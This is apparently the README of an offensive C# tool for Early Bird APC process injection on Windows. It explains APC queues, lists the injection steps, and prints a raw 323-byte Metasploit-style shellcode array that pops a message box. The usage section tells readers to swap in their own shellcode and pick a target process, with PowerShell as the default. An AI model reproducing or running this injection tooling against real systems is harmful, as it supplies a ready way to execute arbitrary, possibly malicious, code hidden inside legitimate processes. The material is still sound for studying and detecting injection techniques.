# EarlyBirdInjection_CSharp

Blog link: working on it

- EarlyBirdInjection, process injection technique.
- Only tested on win10/x64, works fine.
- Some simplified context around threads and APC queues:
	1. Threads execute code within processes
	2. Threads can execute code asynchronously by leveraging APC queues
	3. Each thread has a queue that stores all the APCs
	4. Application can queue an APC to a given thread (subject to privileges)
	5. **When a thread is scheduled, queued APCs get executed.**
	6. Disadvantage of this technique is that the malicious program cannot force the victim thread to execute the injected code - the thread to which an APC was queued to, needs to enter/be in an alert state (i.e SleepEx), but you may want to check out Shellcode Execution in a Local Process with QueueUserAPC and NtTestAlert
	
- Steps
	1. Find process id.
	2. Open process 
	3. Allocate memory into process memory space.
	4. Write shellcode into the process memory space.
	5. Create a thread with a suspended state.
	6. Queue an APC to the threads.
	7. ResumeThread.
	
- The shellcode below is a messagebox
```
            /*   Messagebox shellcode   */
            byte[] buf1 = new byte[323] {
            0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
            0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
            0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
            0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
            0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
            0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
            0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
            0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
            0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
            0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
            0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
            0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
            0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
            0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
            0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0x1a,0x01,0x00,0x00,0x3e,0x4c,0x8d,
            0x85,0x2b,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
            0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,
            0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
            0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x48,0x65,0x6c,0x6c,0x6f,
            0x2c,0x20,0x66,0x72,0x6f,0x6d,0x20,0x4d,0x53,0x46,0x21,0x00,0x4d,0x65,0x73,
            0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00 };
			
```

## Usage 
1. Replace the shellcode with your own.
	![avatar](https://raw.githubusercontent.com/Kara-4search/ProjectPics/main/EarlyBirdInject_shellcode.png)
2. Set the process name you want to inject
	* default name in the project is Powershell.
	![avatar](https://raw.githubusercontent.com/Kara-4search/ProjectPics/main/EarlyBirdInject_processname.png)
3. And the messagebox show up.
	![avatar](https://raw.githubusercontent.com/Kara-4search/ProjectPics/main/EarlyBirdInject_messagebox.png)
	
	
## TO-DO list
- NONE

## Update history
- NONE

## Reference link:
	1. http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FAPC%2FNtQueueApcThread.html
	2. https://idiotc4t.com/code-and-dll-process-injection/apc-and-nttestalert-code-execute
	3. https://idiotc4t.com/code-and-dll-process-injection/apc-injection
	4. https://idiotc4t.com/code-and-dll-process-injection/apc-thread-hijack
	5. https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert
	6. https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection
	7. https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection
	8. https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
	9. http://pinvoke.net/default.aspx/kernel32/CreateRemoteThread.html
	10. https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
	11. https://malcomvetter.medium.com/net-process-injection-1a1af00359bc
	12. https://github.com/pwndizzle/c-sharp-memory-injection/blob/master/apc-injection-new-process.cs
	13. https://introspelliam.github.io/2017/06/22/tools/??????metasploit???EXITFUNC???????????????/
	14. http://garage4hackers.com/showthread.php?t=1820
